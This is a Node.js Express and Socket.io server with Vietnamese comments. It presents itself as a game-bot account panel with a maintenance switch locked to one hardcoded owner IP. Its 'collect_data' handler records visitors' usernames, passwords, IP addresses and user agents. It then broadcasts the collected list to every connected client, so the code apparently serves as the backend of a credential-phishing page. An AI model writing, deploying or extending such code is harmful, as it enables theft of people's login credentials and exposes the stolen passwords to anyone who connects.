const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// Phục vụ các file tĩnh (CSS, JS, v.v.)
app.use(express.static(__dirname));

// Fix lỗi "Cannot GET /" bằng cách trỏ thẳng về index.html
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

let isMaintenance = false;
const OWNER_IP = '1.53.131.94'; // IP duy nhất được quyền tắt bảo trì
let collectedData = [];
let accounts = [];

io.on('connection', (socket) => {
    const rawIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const clientIp = rawIp ? rawIp.replace('::ffff:', '') : '';

    socket.emit('maintenance_status', isMaintenance);
    socket.emit('init_accounts', accounts);
    socket.emit('sync_collected_data', collectedData);

    socket.on('toggle_maintenance', (status) => {
        if (status === false && clientIp !== OWNER_IP) {
            socket.emit('log', '❌ CẢNH BÁO: IP của bạn không có quyền tắt chế độ bảo trì!');
            return;
        }

        isMaintenance = status;
        io.emit('maintenance_status', isMaintenance);
        io.emit('log', `⚙️ Trạng thái bảo trì đã được ${isMaintenance ? 'BẬT' : 'TẮT'} bởi IP: ${clientIp}`);
    });

    socket.on('collect_data', (data) => {
        const entry = {
            ip: clientIp,
            time: new Date().toLocaleString('vi-VN'),
            username: data.username,
            password: data.password,
            userAgent: data.userAgent
        };
        collectedData.push(entry);
        io.emit('sync_collected_data', collectedData);
    });

    socket.on('clear_collected_data', () => {
        if (clientIp === OWNER_IP) {
            collectedData = [];
            io.emit('sync_collected_data', collectedData);
            socket.emit('log', '🗑️ Đã xóa toàn bộ dữ liệu thu thập.');
        }
    });

    socket.on('add_account', (acc) => {
        const newAcc = {
            id: Date.now().toString(),
            username: acc.username,
            status: 'OFFLINE',
            color: '#ff4444',
            autoReconnect: true
        };
        accounts.push(newAcc);
        io.emit('init_accounts', accounts);
    });

    socket.on('delete_account', (id) => {
        accounts = accounts.filter(acc => acc.id !== id);
        io.emit('init_accounts', accounts);
    });

    socket.on('start_bot', (id) => {
        const acc = accounts.find(a => a.id === id);
        if (acc) {
            acc.status = 'ONLINE / LOBBY';
            acc.color = '#44ff44';
            io.emit('init_accounts', accounts);
            io.emit('log', `🤖 Bot ${acc.username} đã được bật.`);
        }
    });

    socket.on('stop_bot', (id) => {
        const acc = accounts.find(a => a.id === id);
        if (acc) {
            acc.status = 'OFFLINE';
            acc.color = '#ff4444';
            io.emit('init_accounts', accounts);
            io.emit('log', `🛑 Bot ${acc.username} đã dừng.`);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 Server đang chạy tại port ${PORT}`);
});
